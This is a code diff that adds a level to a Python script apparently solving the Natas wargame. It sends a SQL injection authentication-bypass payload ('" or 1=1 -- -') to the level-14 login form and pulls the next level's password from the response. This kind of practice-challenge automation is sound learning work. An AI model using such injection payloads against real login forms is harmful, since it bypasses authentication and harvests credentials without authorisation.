@@ -305,4 +305,21 @@ try:
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
 
+# Level 14
+try:
+  data = {'username':'" or 1=1 -- -','password':'test'}
+  response = requests.post(url_dict["natas14"]+"/index.php", auth=cred_dict["natas14"],data=data)
+  response.raise_for_status()
+  print("\nLevel 14")
+  print("Sending SQL injection payload:") 
+  # Parse the response
+  soup = BeautifulSoup(response.text, "html.parser")
+  text_only = soup.get_text(separator=" ", strip=True)
+  cred_dict["natas15"] = ("natas15",text_only.split()[-3])
+
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
+
+# Level 15
+
 print(cred_dict)
